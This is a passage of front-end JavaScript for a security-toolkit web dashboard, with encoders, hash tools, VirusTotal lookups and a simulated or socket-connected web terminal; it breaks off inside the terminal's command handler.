document.addEventListener('DOMContentLoaded', () => {
    // Clock functionality
    function updateClock() {
        const now = new Date();
        const timeString = now.toLocaleTimeString('en-US', { hour12: false });
        document.getElementById('clock').textContent = timeString;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // Server status functionality
    function updateServerStatus() {
        const remoteUrl = localStorage.getItem('cyber_remote_url') || '';
        const serverStatus = document.getElementById('server-status');
        if (remoteUrl) {
            // Extract hostname/IP from URL
            try {
                const url = new URL(remoteUrl);
                serverStatus.textContent = `SERVER: ${url.hostname}:${url.port || '3000'}`;
                serverStatus.style.color = '#00aaff'; // Blue for remote
            } catch (e) {
                serverStatus.textContent = `SERVER: REMOTE`;
                serverStatus.style.color = '#00aaff';
            }
        } else {
            serverStatus.textContent = 'SERVER: LOCAL';
            serverStatus.style.color = '#00ff00'; // Green for local
        }
    }
    updateServerStatus();

    // Helper function to normalize server URL (accepts IP or full URL)
    function normalizeServerUrl(input) {
        if (!input || input.trim() === '') return '';

        input = input.trim();

        // If it already starts with http:// or https://, return as-is
        if (input.startsWith('http://') || input.startsWith('https://')) {
            return input;
        }

        // Check if it's an IP address (with or without port)
        // Matches: 192.168.1.1, 192.168.1.1:3000, localhost, localhost:3000
        const ipPattern = /^[\d\.]+(:?\d+)?$|^localhost(:?\d+)?$/;

        if (ipPattern.test(input)) {
            // If no port specified, add :3000
            if (!input.includes(':')) {
                input += ':3000';
            }
            return 'http://' + input;
        }

        // If it looks like a domain name without protocol
        // Add http:// and :3000 if no port
        if (!input.includes(':')) {
            return 'http://' + input + ':3000';
        }

        return 'http://' + input;
    }

    // Route to tool ID mapping
    const routeMap = {
        'encoders/base64': 'base64',
        'encoders/base32': 'base32',
        'encoders/url': 'url',
        'encoders/hex': 'hex',
        'encoders/hash': 'hash',
        'generators/password': 'password',
        'hash/md5': 'md5',
        'hash/sha1': 'sha1',
        'hash/sha256': 'sha256',
        'hash/sha512': 'sha512',
        'scanners/virustotal-file': 'vt-file',
        'scanners/virustotal-hash': 'vt-hash',
        'scanners/virustotal-url': 'vt-url',
        'scanners/virustotal-ip': 'vt-ip',
        'network/pcap': 'pcap',
        'terminal/shell': 'terminal',
        'settings/connection': 'connection',
        'crypto/jwt': 'jwt',
        'crypto/password': 'password',
        'utilities/timestamp': 'timestamp',
        'kali/all': 'kali-all',
        'kali/nmap': 'kali-nmap',
        'kali/wireshark': 'kali-wireshark',
        'kali/netcat': 'kali-netcat',
        'kali/nikto': 'kali-nikto',
        'kali/sqlmap': 'kali-sqlmap',
        'kali/hydra': 'kali-hydra',
        'kali/john': 'kali-john',
        'kali/whois': 'kali-whois',
        'kali/dig': 'kali-dig',
        'kali/metasploit': 'kali-metasploit'
    };

    // Category names mapping
    const categoryNames = {
        'encoders': 'ENCODERS/DECODERS',
        'hash': 'HASH_TOOLS',
        'virustotal': 'VIRUSTOTAL',
        'terminal': 'TERMINAL',
        'crypto': 'CRYPTO_TOOLS',
        'utilities': 'UTILITIES',
        'kali': 'KALI_TOOLS'
    };

    // Tool names mapping
    const toolNames = {
        'base64': 'BASE64',
        'base32': 'BASE32',
        'url': 'URL_ENCODER',
        'hex': 'HEX',
        'md5': 'MD5',
        'sha1': 'SHA1',
        'sha256': 'SHA256',
        'sha512': 'SHA512',
        'vt-file': 'FILE_SCANNER',
        'vt-url': 'URL_SCANNER',
        'vt-hash': 'HASH_LOOKUP',
        'vt-ip': 'IP/DOMAIN_LOOKUP',
        'terminal': 'WEB_TERMINAL',
        'connection': 'REMOTE_CONNECTION',
        'jwt': 'JWT_DECODER',
        'password': 'PASSWORD_GEN',
        'timestamp': 'TIMESTAMP',
        'kali-all': 'ALL_TOOLS',
        'kali-nmap': 'NMAP',
        'kali-wireshark': 'WIRESHARK',
        'kali-netcat': 'NETCAT',
        'kali-nikto': 'NIKTO',
        'kali-sqlmap': 'SQLMAP',
        'kali-hydra': 'HYDRA',
        'kali-john': 'JOHN',
        'kali-whois': 'WHOIS',
        'kali-dig': 'DIG',
        'kali-metasploit': 'METASPLOIT'
    };

    // Category expand/collapse logic
    const categoryHeaders = document.querySelectorAll('.category-header');
    categoryHeaders.forEach(header => {
        header.addEventListener('click', () => {
            const items = header.nextElementSibling;
            const isExpanded = header.classList.contains('expanded');

            if (isExpanded) {
                header.classList.remove('expanded');
                items.classList.remove('expanded');
            } else {
                header.classList.add('expanded');
                items.classList.add('expanded');
            }
        });
    });

    // Update breadcrumb
    function updateBreadcrumb(route) {
        const breadcrumb = document.getElementById('breadcrumb');
        if (!route) {
            breadcrumb.innerHTML = '<span class="breadcrumb-item">HOME</span>';
            return;
        }

        const parts = route.split('/');
        const category = categoryNames[parts[0]] || parts[0].toUpperCase();
        const toolId = routeMap[route];
        const tool = toolNames[toolId] || parts[1].toUpperCase();

        breadcrumb.innerHTML = `
            <span class="breadcrumb-item">HOME</span>
            <span class="breadcrumb-item">${category}</span>
            <span class="breadcrumb-item">${tool}</span>
        `;
    }

    // --- Remote Connection Helper ---
    function getRemoteUrl() {
        return localStorage.getItem('cyber_remote_url') || '';
    }

    function getApiUrl(path) {
        const remoteUrl = getRemoteUrl();
        if (remoteUrl) {
            // Remove trailing slash from remoteUrl and leading slash from path
            const baseUrl = remoteUrl.replace(/\/$/, '');
            const endpoint = path.replace(/^\//, '');
            return `${baseUrl}/${endpoint}`;
        }
        return path;
    }

    function getSocketUrl() {
        const remoteUrl = getRemoteUrl();
        return remoteUrl || undefined; // undefined means auto-connect to current host
    }

    // Navigate to route
    function navigateTo(route) {
        const toolId = routeMap[route];
        if (!toolId) return;

        // Update URL hash
        window.location.hash = route;

        // Remove active class from all items and panels
        document.querySelectorAll('.category-items li').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelectorAll('.tool-panel').forEach(panel => {
            panel.classList.remove('active');
        });

        // Add active class to current item
        const activeItem = document.querySelector(`[data-route="${route}"]`);
        if (activeItem) {
            activeItem.classList.add('active');

            // Expand parent category
            const categoryItems = activeItem.closest('.category-items');
            const categoryHeader = categoryItems.previousElementSibling;
            categoryHeader.classList.add('expanded', 'active');
            categoryItems.classList.add('expanded');
        }

        // Show corresponding panel
        const panel = document.getElementById(`${toolId}-tool`);
        if (panel) {
            panel.classList.add('active');
        }

        // Update breadcrumb
        updateBreadcrumb(route);
    }

    // Handle route clicks
    document.querySelectorAll('[data-route]').forEach(item => {
        item.addEventListener('click', () => {
            const route = item.dataset.route;
            navigateTo(route);
        });
    });

    // Handle browser back/forward
    window.addEventListener('hashchange', () => {
        const route = window.location.hash.slice(1);
        if (route && routeMap[route]) {
            navigateTo(route);
        }
    });

    // Initialize route from URL hash or default to first tool
    const initialRoute = window.location.hash.slice(1);
    if (initialRoute && routeMap[initialRoute]) {
        navigateTo(initialRoute);
    } else {
        navigateTo('encoders/base64');
    }

    // --- Base64 Tool ---
    const base64Input = document.getElementById('base64-input');
    const base64Output = document.getElementById('base64-output');

    document.getElementById('btn-base64-encode').addEventListener('click', () => {
        try {
            if (!base64Input.value) return;
            base64Output.value = btoa(base64Input.value);
        } catch (e) { base64Output.value = 'ERROR: ENCODING_FAILED'; }
    });

    document.getElementById('btn-base64-decode').addEventListener('click', () => {
        try {
            if (!base64Input.value) return;
            base64Output.value = atob(base64Input.value);
        } catch (e) { base64Output.value = 'ERROR: INVALID_BASE64'; }
    });

    document.getElementById('btn-base64-clear').addEventListener('click', () => {
        base64Input.value = '';
        base64Output.value = '';
    });

    // --- Base32 Tool (Simple Implementation) ---
    const base32Input = document.getElementById('base32-input');
    const base32Output = document.getElementById('base32-output');
    const base32Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

    function base32Encode(s) {
        let bits = 0;
        let value = 0;
        let output = "";
        for (let i = 0; i < s.length; i++) {
            value = (value << 8) | s.charCodeAt(i);
            bits += 8;
            while (bits >= 5) {
                output += base32Chars[(value >>> (bits - 5)) & 31];
                bits -= 5;
            }
        }
        if (bits > 0) {
            output += base32Chars[(value << (5 - bits)) & 31];
        }
        while (output.length % 8 !== 0) {
            output += "=";
        }
        return output;
    }

    function base32Decode(s) {
        let bits = 0;
        let value = 0;
        let output = "";
        s = s.replace(/=+$/, "");
        for (let i = 0; i < s.length; i++) {
            let idx = base32Chars.indexOf(s[i].toUpperCase());
            if (idx === -1) throw new Error("Invalid Base32 character");
            value = (value << 5) | idx;
            bits += 5;
            while (bits >= 8) {
                output += String.fromCharCode((value >>> (bits - 8)) & 255);
                bits -= 8;
            }
        }
        return output;
    }

    document.getElementById('btn-base32-encode').addEventListener('click', () => {
        try {
            if (!base32Input.value) return;
            base32Output.value = base32Encode(base32Input.value);
        } catch (e) { base32Output.value = 'ERROR: ENCODING_FAILED'; }
    });

    document.getElementById('btn-base32-decode').addEventListener('click', () => {
        try {
            if (!base32Input.value) return;
            base32Output.value = base32Decode(base32Input.value);
        } catch (e) { base32Output.value = 'ERROR: INVALID_BASE32'; }
    });

    document.getElementById('btn-base32-clear').addEventListener('click', () => {
        base32Input.value = '';
        base32Output.value = '';
    });

    // --- Hashing Tools (MD5, SHA1, SHA256, SHA512) ---
    function setupHasher(type, algo) {
        const input = document.getElementById(`${type}-input`);
        const output = document.getElementById(`${type}-output`);
        const fileInput = document.getElementById(`${type}-file`);

        document.getElementById(`btn-${type}-hash`).addEventListener('click', () => {
            if (fileInput && fileInput.files.length > 0) {
                const file = fileInput.files[0];
                const reader = new FileReader();
                reader.onload = function (e) {
                    const wordArray = CryptoJS.lib.WordArray.create(e.target.result);
                    output.value = algo(wordArray).toString();
                };
                reader.readAsArrayBuffer(file);
            } else if (input.value) {
                output.value = algo(input.value).toString();
            }
        });

        document.getElementById(`btn-${type}-clear`).addEventListener('click', () => {
            input.value = '';
            output.value = '';
            if (fileInput) fileInput.value = '';
        });
    }

    if (typeof CryptoJS !== 'undefined') {
        setupHasher('md5', CryptoJS.MD5);
        setupHasher('sha1', CryptoJS.SHA1);
        setupHasher('sha256', CryptoJS.SHA256);
        setupHasher('sha512', CryptoJS.SHA512);
    } else {
        console.error("CryptoJS not loaded");
    }

    // --- MD5 Hash Comparison ---
    const md5Expected = document.getElementById('md5-expected');
    const md5Output = document.getElementById('md5-output');
    const md5ComparisonResult = document.getElementById('md5-comparison-result');

    document.getElementById('btn-md5-compare').addEventListener('click', () => {
        const expectedHash = md5Expected.value.trim().toLowerCase();
        const actualHash = md5Output.value.trim().toLowerCase();

        if (!expectedHash || !actualHash) {
            md5ComparisonResult.className = 'comparison-result mismatch';
            md5ComparisonResult.textContent = 'ERROR: BOTH HASHES REQUIRED FOR COMPARISON';
            return;
        }

        if (expectedHash === actualHash) {
            md5ComparisonResult.className = 'comparison-result match';
            md5ComparisonResult.textContent = '✓ MATCH: FILE INTEGRITY VERIFIED';
        } else {
            md5ComparisonResult.className = 'comparison-result mismatch';
            md5ComparisonResult.textContent = '✗ MISMATCH: FILE INTEGRITY COMPROMISED';
        }
    });

    // Clear comparison result when clearing MD5 fields
    const originalMd5Clear = document.getElementById('btn-md5-clear');
    originalMd5Clear.addEventListener('click', () => {
        md5Expected.value = '';
        md5ComparisonResult.className = 'comparison-result';
        md5ComparisonResult.textContent = '';
    });

    // --- URL Tool ---
    const urlInput = document.getElementById('url-input');
    const urlOutput = document.getElementById('url-output');

    document.getElementById('btn-url-encode').addEventListener('click', () => {
        if (!urlInput.value) return;
        urlOutput.value = encodeURIComponent(urlInput.value);
    });

    document.getElementById('btn-url-decode').addEventListener('click', () => {
        try {
            if (!urlInput.value) return;
            urlOutput.value = decodeURIComponent(urlInput.value);
        } catch (e) { urlOutput.value = 'ERROR: INVALID_URL_ENCODING'; }
    });

    document.getElementById('btn-url-clear').addEventListener('click', () => {
        urlInput.value = '';
        urlOutput.value = '';
    });

    // --- Hex Tool ---
    const hexInput = document.getElementById('hex-input');
    const hexOutput = document.getElementById('hex-output');

    document.getElementById('btn-hex-encode').addEventListener('click', () => {
        if (!hexInput.value) return;
        let hex = '';
        for (let i = 0; i < hexInput.value.length; i++) {
            hex += hexInput.value.charCodeAt(i).toString(16).padStart(2, '0');
        }
        hexOutput.value = hex;
    });

    document.getElementById('btn-hex-decode').addEventListener('click', () => {
        try {
            let hex = hexInput.value.replace(/\s/g, '');
            if (hex.length % 2 !== 0) throw new Error('Invalid length');
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            hexOutput.value = str;
        } catch (e) { hexOutput.value = 'ERROR: INVALID_HEX_STRING'; }
    });

    document.getElementById('btn-hex-clear').addEventListener('click', () => {
        hexInput.value = '';
        hexOutput.value = '';
    });

    // Glitch effect
    const title = document.querySelector('.glitch');
    title.addEventListener('mouseover', () => {
        let original = title.dataset.text;
        let iterations = 0;
        const interval = setInterval(() => {
            title.innerText = title.innerText.split('')
                .map((letter, index) => {
                    if (index < iterations) return original[index];
                    return String.fromCharCode(65 + Math.floor(Math.random() * 26));
                })
                .join('');

            if (iterations >= original.length) clearInterval(interval);
            iterations += 1 / 3;
        }, 30);
    });

    // --- VirusTotal Integration ---

    // Helper function to show status
    function showStatus(elementId, message) {
        const statusEl = document.getElementById(elementId);
        statusEl.textContent = message;
        statusEl.classList.add('active');
    }

    // Helper function to hide status
    function hideStatus(elementId) {
        const statusEl = document.getElementById(elementId);
        statusEl.classList.remove('active');
    }

    // Helper function to show result
    function showResult(elementId, html) {
        const resultEl = document.getElementById(elementId);
        resultEl.innerHTML = html;
        resultEl.classList.add('active');
    }

    // Helper function to hide result
    function hideResult(elementId) {
        const resultEl = document.getElementById(elementId);
        resultEl.classList.remove('active');
        resultEl.innerHTML = '';
    }

    // Helper function to get threat class
    function getThreatClass(malicious, suspicious) {
        if (malicious > 0) return 'malicious';
        if (suspicious > 0) return 'suspicious';
        return 'safe';
    }

    // Helper function to poll for analysis results
    async function pollAnalysis(analysisId, resultElementId, statusElementId) {
        showStatus(statusElementId, 'ANALYZING... PLEASE WAIT...');

        let attempts = 0;
        const maxAttempts = 20;

        const poll = async () => {
            try {
                const response = await fetch(`/api/vt/file-report/${analysisId}`);
                const data = await response.json();

                if (data.data && data.data.attributes && data.data.attributes.status === 'completed') {
                    hideStatus(statusElementId);
                    displayAnalysisResult(data.data.attributes, resultElementId);
                } else if (attempts < maxAttempts) {
                    attempts++;
                    setTimeout(poll, 3000); // Poll every 3 seconds
                } else {
                    hideStatus(statusElementId);
                    showResult(resultElementId, '<p style="color: #ff3333;">ANALYSIS TIMEOUT. TRY AGAIN LATER.</p>');
                }
            } catch (error) {
                hideStatus(statusElementId);
                showResult(resultElementId, `<p style="color: #ff3333;">ERROR: ${error.message}</p>`);
            }
        };

        poll();
    }

    // Helper function to display analysis results
    function displayAnalysisResult(attributes, resultElementId) {
        const stats = attributes.stats || {};
        const malicious = stats.malicious || 0;
        const suspicious = stats.suspicious || 0;
        const undetected = stats.undetected || 0;
        const total = malicious + suspicious + undetected + (stats.harmless || 0);

        const threatClass = getThreatClass(malicious, suspicious);

        let html = `
            <h3>SCAN RESULTS</h3>
            <div class="detection-ratio ${threatClass}">
                DETECTION: ${malicious}/${total} (${suspicious} SUSPICIOUS)
            </div>
            <div class="info-row">
                <span class="info-label">STATUS:</span>
                <span class="info-value">${threatClass.toUpperCase()}</span>
            </div>
        `;

        if (attributes.results) {
            html += '<h3>VENDOR DETECTIONS</h3><div class="vendor-list">';
            const vendors = Object.entries(attributes.results).slice(0, 20);
            vendors.forEach(([vendor, result]) => {
                const detected = result.category === 'malicious' || result.category === 'suspicious';
                const detectedClass = detected ? 'detected' : '';
                html += `
                    <div class="vendor-item ${detectedClass}">
                        <strong>${vendor}:</strong> ${result.result || 'Clean'}
                    </div>
                `;
            });
            html += '</div>';
        }

        showResult(resultElementId, html);
    }

    // VirusTotal File Scanner
    const vtFileInput = document.getElementById('vt-file-input');
    document.getElementById('btn-vt-file-scan').addEventListener('click', async () => {
        if (!vtFileInput.files.length) {
            showResult('vt-file-result', '<p style="color: #ff3333;">ERROR: NO FILE SELECTED</p>');
            return;
        }

        const formData = new FormData();
        formData.append('file', vtFileInput.files[0]);

        showStatus('vt-file-status', 'UPLOADING FILE TO VIRUSTOTAL...');
        hideResult('vt-file-result');

        try {
            const response = await fetch('/api/vt/file-scan', {
                method: 'POST',
                body: formData
            });

            const data = await response.json();

            if (data.data && data.data.id) {
                pollAnalysis(data.data.id, 'vt-file-result', 'vt-file-status');
            } else {
                hideStatus('vt-file-status');
                showResult('vt-file-result', `<p style="color: #ff3333;">ERROR: ${data.error || 'SCAN FAILED'}</p>`);
            }
        } catch (error) {
            hideStatus('vt-file-status');
            showResult('vt-file-result', `<p style="color: #ff3333;">ERROR: ${error.message}</p>`);
        }
    });

    document.getElementById('btn-vt-file-clear').addEventListener('click', () => {
        vtFileInput.value = '';
        hideStatus('vt-file-status');
        hideResult('vt-file-result');
    });

    // VirusTotal URL Scanner
    const vtUrlInput = document.getElementById('vt-url-input');
    document.getElementById('btn-vt-url-scan').addEventListener('click', async () => {
        const url = vtUrlInput.value.trim();
        if (!url) {
            showResult('vt-url-result', '<p style="color: #ff3333;">ERROR: NO URL PROVIDED</p>');
            return;
        }

        showStatus('vt-url-status', 'SUBMITTING URL TO VIRUSTOTAL...');
        hideResult('vt-url-result');

        try {
            const response = await fetch('/api/vt/url-scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url })
            });

            const data = await response.json();

            if (data.data && data.data.id) {
                pollAnalysis(data.data.id, 'vt-url-result', 'vt-url-status');
            } else {
                hideStatus('vt-url-status');
                showResult('vt-url-result', `<p style="color: #ff3333;">ERROR: ${data.error || 'SCAN FAILED'}</p>`);
            }
        } catch (error) {
            hideStatus('vt-url-status');
            showResult('vt-url-result', `<p style="color: #ff3333;">ERROR: ${error.message}</p>`);
        }
    });

    document.getElementById('btn-vt-url-clear').addEventListener('click', () => {
        vtUrlInput.value = '';
        hideStatus('vt-url-status');
        hideResult('vt-url-result');
    });

    // VirusTotal Hash Lookup
    const vtHashInput = document.getElementById('vt-hash-input');
    document.getElementById('btn-vt-hash-lookup').addEventListener('click', async () => {
        const hash = vtHashInput.value.trim();
        if (!hash) {
            showResult('vt-hash-result', '<p style="color: #ff3333;">ERROR: NO HASH PROVIDED</p>');
            return;
        }

        showStatus('vt-hash-status', 'LOOKING UP HASH IN VIRUSTOTAL DATABASE...');
        hideResult('vt-hash-result');

        try {
            const response = await fetch(`/api/vt/hash-lookup/${hash}`);
            const data = await response.json();

            if (data.data && data.data.attributes) {
                hideStatus('vt-hash-status');
                const attrs = data.data.attributes;
                const stats = attrs.last_analysis_stats || {};
                const malicious = stats.malicious || 0;
                const suspicious = stats.suspicious || 0;
                const undetected = stats.undetected || 0;
                const total = malicious + suspicious + undetected + (stats.harmless || 0);

                const threatClass = getThreatClass(malicious, suspicious);

                let html = `
                    <h3>HASH LOOKUP RESULTS</h3>
                    <div class="detection-ratio ${threatClass}">
                        DETECTION: ${malicious}/${total} (${suspicious} SUSPICIOUS)
                    </div>
                    <div class="info-row">
                        <span class="info-label">FILE NAME:</span>
                        <span class="info-value">${attrs.meaningful_name || 'N/A'}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">FILE TYPE:</span>
                        <span class="info-value">${attrs.type_description || 'N/A'}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">SIZE:</span>
                        <span class="info-value">${attrs.size || 'N/A'} bytes</span>
                    </div>
                `;

                showResult('vt-hash-result', html);
            } else {
                hideStatus('vt-hash-status');
                showResult('vt-hash-result', `<p style="color: #ff3333;">ERROR: ${data.error || 'HASH NOT FOUND'}</p>`);
            }
        } catch (error) {
            hideStatus('vt-hash-status');
            showResult('vt-hash-result', `<p style="color: #ff3333;">ERROR: ${error.message}</p>`);
        }
    });

    document.getElementById('btn-vt-hash-clear').addEventListener('click', () => {
        vtHashInput.value = '';
        hideStatus('vt-hash-status');
        hideResult('vt-hash-result');
    });

    // VirusTotal IP/Domain Lookup
    const vtIpInput = document.getElementById('vt-ip-input');
    const vtIpType = document.getElementById('vt-ip-type');

    document.getElementById('btn-vt-ip-lookup').addEventListener('click', async () => {
        const value = vtIpInput.value.trim();
        const type = vtIpType.value;

        if (!value) {
            showResult('vt-ip-result', '<p style="color: #ff3333;">ERROR: NO IP/DOMAIN PROVIDED</p>');
            return;
        }

        const endpoint = type === 'ip' ? `/api/vt/ip-lookup/${value}` : `/api/vt/domain-lookup/${value}`;
        showStatus('vt-ip-status', `LOOKING UP ${type.toUpperCase()} IN VIRUSTOTAL...`);
        hideResult('vt-ip-result');

        try {
            const response = await fetch(endpoint);
            const data = await response.json();

            if (data.data && data.data.attributes) {
                hideStatus('vt-ip-status');
                const attrs = data.data.attributes;
                const stats = attrs.last_analysis_stats || {};
                const malicious = stats.malicious || 0;
                const suspicious = stats.suspicious || 0;
                const harmless = stats.harmless || 0;
                const undetected = stats.undetected || 0;
                const total = malicious + suspicious + harmless + undetected;

                const threatClass = getThreatClass(malicious, suspicious);

                let html = `
                    <h3>${type.toUpperCase()} REPUTATION</h3>
                    <div class="detection-ratio ${threatClass}">
                        MALICIOUS: ${malicious}/${total} (${suspicious} SUSPICIOUS)
                    </div>
                    <div class="info-row">
                        <span class="info-label">REPUTATION:</span>
                        <span class="info-value">${attrs.reputation || 0}</span>
                    </div>
                `;

                if (type === 'domain') {
                    html += `
                        <div class="info-row">
                            <span class="info-label">CATEGORIES:</span>
                            <span class="info-value">${Object.values(attrs.categories || {}).join(', ') || 'N/A'}</span>
                        </div>
                    `;
                }

                showResult('vt-ip-result', html);
            } else {
                hideStatus('vt-ip-status');
                showResult('vt-ip-result', `<p style="color: #ff3333;">ERROR: ${data.error || 'LOOKUP FAILED'}</p>`);
            }
        } catch (error) {
            hideStatus('vt-ip-status');
            showResult('vt-ip-result', `<p style="color: #ff3333;">ERROR: ${error.message}</p>`);
        }
    });

    document.getElementById('btn-vt-ip-clear').addEventListener('click', () => {
        vtIpInput.value = '';
        hideStatus('vt-ip-status');
        hideResult('vt-ip-result');
    });

    // --- Hybrid Terminal Integration ---
    let terminalInstance = null;
    let terminalInitialized = false;
    let socket = null;
    let terminalMode = null; // 'simulated' or 'real'

    // Client-side File System (Restored)
    const fileSystem = {
        '/root': {
            type: 'dir',
            children: {
                'Documents': { type: 'dir', children: {} },
                'Downloads': { type: 'dir', children: {} },
                'Tools': { type: 'dir', children: {} },
                'scan_report.pdf': { type: 'file' },
                'notes.txt': { type: 'file' }
            }
        }
    };

    let currentCwd = '/root';
    let commandBuffer = '';

    function resolvePath(cwd, target) {
        if (!target) return cwd;
        let parts;
        if (target.startsWith('/')) {
            parts = target.split('/').filter(p => p);
        } else {
            const cwdParts = cwd.split('/').filter(p => p);
            const targetParts = target.split('/').filter(p => p);
            parts = [...cwdParts, ...targetParts];
        }
        const stack = [];
        for (const part of parts) {
            if (part === '.') continue;
            if (part === '..') {
                stack.pop();
            } else {
                stack.push(part);
            }
        }
        return '/' + stack.join('/');
    }

    function getDir(path) {
        if (path === '/') return { type: 'dir', children: fileSystem };
        if (path === '/root') return fileSystem['/root'];
        if (path.startsWith('/root/')) {
            const parts = path.split('/').slice(2);
            let current = fileSystem['/root'];
            for (const part of parts) {
                if (current && current.children && current.children[part]) {
                    current = current.children[part];
                } else {
                    return null;
                }
            }
            return current;
        } else if (path === '/') {
            return { type: 'dir', children: { 'root': fileSystem['/root'] } };
        }
        return null;
    }

    function initializeTerminal(mode) {
        if (terminalInitialized) return;
        terminalMode = mode;

        // Create xterm instance
        terminalInstance = new Terminal({
            cursorBlink: true,
            fontSize: 14,
            fontFamily: 'Share Tech Mono, monospace',
            theme: {
                background: '#000000',
                foreground: '#00ff00',
                cursor: '#00ff00',
                cursorAccent: '#000000',
                selection: '#003300'
            },
            scrollback: 5000,
            scrollOnUserInput: true,
            screenReaderMode: true
        });

        const fitAddon = new FitAddon.FitAddon();
        terminalInstance.loadAddon(fitAddon);

        const container = document.getElementById('terminal-container');
        terminalInstance.open(container);
        fitAddon.fit();

        window.addEventListener('resize', () => {
            fitAddon.fit();
            if ((terminalMode === 'real' || terminalMode === 'localhost') && socket) {
                socket.emit('resize', { cols: terminalInstance.cols, rows: terminalInstance.rows });
            }
        });

        if (terminalMode === 'localhost') {
            // Local host mode - connect to localhost:3000
            terminalInstance.writeln('\x1b[1;32m╔═══════════════════════════════════════════════════════════╗\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m║         LOCAL HOST TERMINAL (LOCALHOST:3000)             ║\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m╚═══════════════════════════════════════════════════════════╝\x1b[0m');
            terminalInstance.writeln('');

            // Connect to localhost explicitly
            if (!socket) socket = io('http://localhost:3000');

            // Forward input to server
            terminalInstance.onData(data => {
                if (socket) {
                    socket.emit('input', data);
                }
            });

            // Receive output from server
            socket.on('output', data => {
                terminalInstance.write(data);
            });

            // Initial resize
            socket.emit('resize', { cols: terminalInstance.cols, rows: terminalInstance.rows });

        } else if (terminalMode === 'real') {
            // Real-time mode
            terminalInstance.writeln('\x1b[1;32m╔═══════════════════════════════════════════════════════════╗\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m║         REAL-TIME TERMINAL (EXPERIMENTAL)                ║\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m╚═══════════════════════════════════════════════════════════╝\x1b[0m');
            terminalInstance.writeln('');

            // Connect socket
            const savedUrl = localStorage.getItem('cyber_terminal_server_url') || getSocketUrl();
            connectTerminalSocket(savedUrl);

        } else {
            // Simulated Mode
            terminalInstance.writeln('\x1b[1;32m╔═══════════════════════════════════════════════════════════╗\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m║         CYBER SECURITY TOOLS - WEB TERMINAL              ║\x1b[0m');
            terminalInstance.writeln('\x1b[1;32m╚═══════════════════════════════════════════════════════════╝\x1b[0m');
            terminalInstance.writeln('');
            terminalInstance.writeln('\x1b[1;33m⚠️  WARNING: Simulated Environment (Safe Mode)\x1b[0m');
            terminalInstance.writeln('');

            const prompt = () => {
                terminalInstance.write(`\r\nroot@kali:${currentCwd}# `);
            };

            prompt();

            terminalInstance.onData(e => {
                switch (e) {
                    case '\r': // Enter
                        terminalInstance.write('\r\n');
                        if (commandBuffer.trim()) {
                            handleCommand(commandBuffer.trim());
                        } else {
                            prompt();
                        }
                        commandBuffer = '';
                        break;
                    case '\u007F': // Backspace
                        if (commandBuffer.length > 0) {
                            terminalInstance.write('\b \b');
                            commandBuffer = commandBuffer.slice(0, -1);
                        }
                        break;
                    default:
                        if (e >= String.fromCharCode(0x20) && e <= String.fromCharCode(0x7E) || e >= '\u00a0') {
                            commandBuffer += e;
                            terminalInstance.write(e);
                        }
                }
            });

            function handleCommand(cmdStr) {
                const args = cmdStr.split(' ');
                const cmd = args[0].toLowerCase();

                switch (cmd) {
                    case 'help':
                        terminalInstance.writeln('Available commands:');
                        terminalInstance.writeln('  \x1b[1;33mhelp\x1b[0m     - Show this help message');
                        terminalInstance.writeln('  \x1b[1;33mls\x1b[0m       - List files');
                        terminalInstance.writeln('  \x1b[1;33mpwd\x1b[0m      - Print working directory');
                        terminalInstance.writeln('  \x1b[1;33mcd\x1b[0m       - Change directory');
                        terminalInstance.writeln('  \x1b[1;33mmkdir\x1b[0m    - Create directory');
                        terminalInstance.writeln('  \x1b[1;33mwhoami\x1b[0m   - Print current user');
                        terminalInstance.writeln('  \x1b[1;33mclear\x1b[0m    - Clear terminal screen');
                        terminalInstance.writeln('  \x1b[1;33msudo\x1b[0m     - Execute a command as another user');
                        terminalInstance.writeln('  \x1b[1;33mpkg\x1b[0m      - Package manager simulation');
                        terminalInstance.writeln('  \x1b[1;33mping\x1b[0m     - Send ICMP ECHO_REQUEST to network hosts');
                        terminalInstance.writeln('  \x1b[1;33mnmap\x1b[0m     - Network exploration tool and security scanner');
                        terminalInstance.writeln('  \x1b[1;33mip\x1b[0m       - Show IP address');
                        terminalInstance.writeln('  \x1b[1;33mnc\x1b[0m       - Netcat (Connect/Listen)');
                        prompt();
                        break;
                    case 'clear':
                        terminalInstance.write('\x1b[2J\x1b[H');
                        prompt();
                        break;
                    case 'ls':
                        const dir = getDir(currentCwd);
                        if (dir && dir.children) {
                            const items = Object.entries(dir.children).map(([name, item]) => {
                                return item.type === 'dir' ? `\x1b[1;34m${name}\x1b[0m` : `\x1b[1;32m${name}\x1b[0m`;
                            });
                            terminalInstance.writeln(items.join('  '));
                        }
                        prompt();
                        break;
                    case 'pwd':
                        terminalInstance.writeln(currentCwd);
                        prompt();
                        break;
                    case 'cd':
                        if (!args[1]) {
                            currentCwd = '/root';
                        } else {
                            const target = resolvePath(currentCwd, args[1]);
                            const targetDir = getDir(target);
                            if (targetDir && targetDir.type === 'dir') {
                                currentCwd = target;
                            } else {
                                terminalInstance.writeln(`bash: cd: ${args[1]}: No such file or directory`);
                            }
                        }
                        prompt();
                        break;
                    case 'mkdir':
                        if (!args[1]) {
                            terminalInstance.writeln('mkdir: missing operand');
                        } else {
                            const currentDirObj = getDir(currentCwd);
                            if (currentDirObj && currentDirObj.type === 'dir') {
                                if (currentDirObj.children[args[1]]) {
                                    terminalInstance.writeln(`mkdir: cannot create directory '${args[1]}': File exists`);
                                } else {
                                    currentDirObj.children[args[1]] = { type: 'dir', children: {} };
                                }
                            } else {
                                terminalInstance.writeln(`mkdir: cannot create directory '${args[1]}': No such file or directory`);
                            }
                        }
                        prompt();
                        break;
                    case 'whoami':
                        terminalInstance.writeln('root');
                        prompt();
                        break;
                    case 'ip':
                        terminalInstance.writeln('eth0: 192.168.1.105');
                        terminalInstance.writeln('lo: 127.0.0.1');
                        prompt();
                        break;
                    case 'sudo':
                        if (args.length > 1) {
